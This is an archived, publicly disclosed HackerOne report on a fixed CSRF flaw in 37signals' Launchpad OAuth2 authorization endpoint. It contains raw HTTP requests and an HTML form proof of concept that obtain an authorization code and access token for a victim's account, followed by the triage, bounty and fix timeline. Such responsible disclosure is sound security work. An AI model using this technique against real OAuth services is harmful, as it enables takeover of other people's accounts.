---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - vuln/csrf
  - fix/authorization-checks
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2020-10-30
submitted: 2020-04-14T23:22:27.499Z
bounty_usd: null
votes: 44
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "carbon61"
source: "https://hackerone.com/reports/850022"
title: "CSRF on launchpad.37signals.com OAuth2 authorization endpoint"
---
# CSRF on launchpad.37signals.com OAuth2 authorization endpoint

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 44 | **Program:** Basecamp | **Disclosed:** 2020-10-30

- Report: [https://hackerone.com/reports/850022](https://hackerone.com/reports/850022)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2020-04-14T23:22:27.499Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,
I found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.

I found that when making a post request to ``` authorization ```  endpoint it does not check the "authenticity token" if you add " .json or .xml " like this "authorization.json" .

##post request:
```
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Content-Length: 168
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=

```


After a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.

## request to get the access token:

```
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}

```

## PoC:

1- you will need to register on the 37Signals Integration Portal.

2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )

3- for testing , submit the following form through the browser in which you are logged in:

```
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
      <input type="hidden" name="client&#95;id" value="{your-client-id}" />
      <input type="hidden" name="client&#95;secret" value="" />
      <input type="hidden" name="type" value="web&#95;server" />
      <input type="hidden" name="redirect&#95;uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

you will get the {authorization-code} so you can exchange it for an access token

## Note that a real attack does not require user interaction.

## Impact

Through this vulnerability an attacker can do malicious actions on the victim's account
full API access to  victim's  account

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2020-04-15** @carbon61: i will check it again and try to generate another Poc if you could not  reproduce it
- **2020-04-15** @carbon61: i'm sorry maybe i reported this one too fast  , i will investigate more and let you know
- **2020-04-15** @carbon61: i just tested it with  different accounts in basecamphq.com and 3.basecamp.com and i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token
- **Report Severity Updated**
- **Report Triaged**
- **2020-04-17** @carbon61: OK thanks .
- **2020-04-20** @carbon61: any updates about the bounty ?
- **2020-04-21** @rosa: Hi @carbon61, sorry for the delay! We'll award a bounty later today, still discussing the amount between the team. We'll be also deploying a fix shortly. 

Thank you again, this was another great find.
- **Bounty Awarded**
- **2020-04-21** @rosa: Hi again @carbon61! We've just sent a bounty and also deployed a fix for this issue. Would you mind verifying whether you can still reproduce it? 

Thank you!
- **2020-04-22** @carbon61: the fix looks good, and thank you very much for the bounty.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
